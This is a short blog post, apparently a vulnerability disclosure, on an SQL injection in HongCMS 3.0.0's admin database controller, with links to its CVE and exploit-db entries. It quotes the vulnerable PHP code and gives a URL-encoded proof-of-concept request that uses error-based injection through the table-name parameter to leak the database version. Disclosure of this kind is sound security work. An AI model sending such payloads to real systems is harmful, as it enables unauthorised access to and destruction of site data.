+++
title = "HongCMS 3.0.0 – SQL Injection"
author = "Hzllaga"
date =  2018-06-29
description = ""
categories = ["原创"]
tags = ["代码审计","PHP","SQL注入"]

+++
Vulnerability file: admin\controllers\database.php<!--more-->
{{< highlight php >}}
private function EmptyTable($tablename)
{
    $this->db->exe("DELETE FROM `$tablename`");
    $msg = '已完成清空数据库表: ' . $tablename . '<br/>';

    return $msg;
}
{{< /highlight >}}

The $tablename parameter controllable.

POC (Administrator Privilege):

{{< highlight php >}}

/admin/index.php/database/operate?dbaction=emptytable&tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60

{{< /highlight >}}

![](https://cdn.wtfsec.org/img/20200223163530.png)
CVE:[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12912)
exploit-db:[https://www.exploit-db.com/exploits/44953/](https://www.exploit-db.com/exploits/44953/)